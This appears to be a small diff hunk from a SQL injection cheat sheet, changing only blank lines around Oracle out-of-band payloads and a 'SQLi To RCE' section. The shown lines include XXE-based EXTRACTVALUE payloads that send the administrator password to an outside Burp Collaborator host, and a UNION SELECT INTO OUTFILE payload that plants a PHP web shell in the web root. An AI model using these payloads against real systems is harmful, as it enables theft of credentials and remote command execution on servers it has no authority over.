@@ -289,9 +289,8 @@ Oracle :
 hE7U87fKPiX6zbQj'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://fq95bvyfk83ofbyg10q59d8l6cc40t.burpcollaborator.net"> %remote;]>'),'/l') FROM dual)--;
 Extract data :
 ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
-
-
 ```
+
 ## SQLi To RCE
 ```sql
 ' UNION SELECT '<?php system($_GET['cmd']); ?>' INTO OUTFILE '/var/www/html/shell.php' #
